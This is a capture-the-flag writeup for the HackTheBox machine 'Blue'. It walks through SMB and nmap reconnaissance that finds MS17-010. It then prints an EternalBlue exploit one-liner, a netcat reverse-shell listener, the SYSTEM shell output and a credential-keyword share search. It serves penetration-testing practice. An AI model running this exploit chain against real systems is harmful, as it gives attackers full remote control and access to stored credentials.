---
render_with_liquid: false
title: HackTheBox Writeup  Blue
date: 2023-09-28 23:53:26 +1400
tags: [hackthebox, nmap, windows, crackmapexec, eternal-blue, ms17-010, cve-2017-0143, oscp-like]
---



Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blue]
└─$ writehosts htb '10.129.220.237 blue.htb haris-PC'
+---------+--------+----------------+----------+
| PROFILE | STATUS |       IP       |  DOMAIN  |
+---------+--------+----------------+----------+
| htb     | on     | 10.129.220.237 | blue.htb |
| htb     | on     | 10.129.220.237 | haris-PC |
+---------+--------+----------------+----------+
```


## Smb

It have **SMBv1** enabled, which is likely vulnerable to Eternal Blue

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blue]
└─$ cme smb blue.htb -u '' -p '' -M ms17-010
SMB         10.129.209.245  445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.129.209.245  445    HARIS-PC         [+] haris-PC\:

┌──(bravosec㉿fsociety)-[~/htb/Blue]
└─$ cme smb blue.htb -u 'a' -p ''
SMB         10.129.209.245  445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.129.209.245  445    HARIS-PC         [+] haris-PC\a:

┌──(bravosec㉿fsociety)-[~/htb/Blue]
└─$ cme smb blue.htb -u 'a' -p '' --shares
SMB         10.129.209.245  445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.129.209.245  445    HARIS-PC         [+] haris-PC\a:
SMB         10.129.209.245  445    HARIS-PC         [*] Enumerated shares
SMB         10.129.209.245  445    HARIS-PC         Share           Permissions     Remark
SMB         10.129.209.245  445    HARIS-PC         -----           -----------     ------
SMB         10.129.209.245  445    HARIS-PC         ADMIN$                          Remote Admin
SMB         10.129.209.245  445    HARIS-PC         C$                              Default share
SMB         10.129.209.245  445    HARIS-PC         IPC$                            Remote IPC
SMB         10.129.209.245  445    HARIS-PC         Share           READ
SMB         10.129.209.245  445    HARIS-PC         Users           READ
```


## Nmap


#### Safe script scan

> Safe script scan will not detect eternal blue, but the info based on `Windows 7` and `smbv1` will lead it for the first try
{: .prompt-warning }

```ruby

# Nmap 7.94 scan initiated Thu Sep 28 23:53:25 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 135,139,445,49152,49153,49154,49155,49156,49157 blue.htb
Nmap scan report for blue.htb (10.129.68.13)
Host is up, received user-set (0.22s latency).
Scanned at 2023-09-28 23:53:26 CST for 74s

PORT      STATE SERVICE          REASON          VERSION
135/tcp   open  msrpc            syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn      syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  ows netbios-ssn" syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc            syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc            syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc            syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc            syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc            syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc            syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-09-28T16:54:26+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
|_clock-skew: mean: -20m06s, deviation: 34m35s, median: -8s
| smb2-time:
|   date: 2023-09-28T15:54:24
|_  start_date: 2023-09-28T15:37:31
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38031/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14683/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28535/udp): CLEAN (Timeout)
|   Check 4 (port 17486/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Sep 28 23:54:40 2023 -- 1 IP address (1 host up) scanned in 74.92 seconds
```


#### Vuln script scan

```ruby

# Nmap 7.94 scan initiated Thu Sep 28 23:00:19 2023 as: nmap -T4 -Pn --script vuln -vv -oA ./nmap/vuln -p- blue.htb
Increasing send delay for 10.129.220.237 from 0 to 5 due to 415 out of 1037 dropped probes since last increase.
Increasing send delay for 10.129.220.237 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for blue.htb (10.129.220.237)
Host is up, received user-set (0.15s latency).
Scanned at 2023-09-28 23:00:30 CST for 948s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false

Read data files from: /usr/bin/../share/nmap

# Nmap done at Thu Sep 28 23:16:19 2023 -- 1 IP address (1 host up) scanned in 959.14 seconds
```

# User Flag
---


# Root Flag
---

## Eternal Blue (One Liner)

> **Target is vulnerable to eternal blue**
> ![](/assets/obsidian/e3976ab77ddf327aab556fc0d81ec243.png)
{: .prompt-tip }

> POC (Best one I found so far) : https://github.com/3ndG4me/AutoBlue-MS17-010

Start Listener

```bash
rlwrap -r -f . nc -nlvp $LPORT
```

I will just use my sweet eternal blue one liner (Can be used for OSCP)

```bash
export LHOST="10.10.16.13" LPORT=1111 RHOST="blue.htb"; cd /opt/sectools/CVE/AutoBlue-MS17-010/shellcode && echo -e "y\n${LHOST}\n1111\n1111\n1\n1" | bash shell_prep.sh && cd .. && python eternalblue_exploit7.py $RHOST ./shellcode/sc_x64.bin 15
```

> In case the exploit failed, there are 3 ways to solve it:
>  1. Change the value of `numGroomConn` (It was `15` in my example) and run again
>  2. Use the exploit module in **metasploit**, it's more stable and reliable
>  3. Reset the machine
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/CVE/AutoBlue-MS17-010]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.13] from (UNKNOWN) [10.129.68.13] 49159
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
c5dd82d0a9ecb32737a11b0b602d5529

C:\Windows\system32>dir C:\Users\
dir C:\Users\
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,428,215,296 bytes free

C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
type C:\Users\haris\Desktop\user.txt
3e9b95900097f7571c1a10c54560e7b4
```


# Additional
---

## Harvest sensitive data from smb shares


### Manspider

> Just for fun

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blue]
└─$ manspider blue.htb -f passw user admin account network login logon cred -d za.tryhackme.loc -u 'a' -p ''
```

![](/assets/obsidian/a81819c52b3de72b0ba46d800062e3f6.png)

I don't think there's something valuable from `Default User`, but I'll still give it a try


### Analyze NTUSER.DAT

- `NTUSER.DAT` is a file for `HKEY_CURRENT_USER hive` , it stores **MFT** (_Master File Table_) data, can be used for user info forensics
- Could use **autopsy** to perform further forensics base on the data from `Users` share if this is a forensics CTF

Check the files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blue]
└─$ cd ~/.manspider/loot

┌──(bravosec㉿fsociety)-[~/.manspider/loot]
└─$ ls
blue.htb_Users_Default_NTUSER.DAT
blue.htb_Users_Default_NTUSER.DAT016888bd6c6f11de8d1d001e0bcde3ec.TM.blf
blue.htb_Users_Default_NTUSER.DAT016888bd6c6f11de8d1d001e0bcde3ec.TMContainer00000000000000000001.regtransms
blue.htb_Users_Default_NTUSER.DAT016888bd6c6f11de8d1d001e0bcde3ec.TMContainer00000000000000000002.regtransms
blue.htb_Users_Default_NTUSER.DAT.LOG
blue.htb_Users_Default_NTUSER.DAT.LOG1
...
```

> Check for [Interesting Windows Registry Keys](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics/interesting-windows-registry-keys) via tools like **Registry Explorer** or **RegRipper**

![](/assets/obsidian/9e20603d60f7d294bd330c0da4b805ce.png)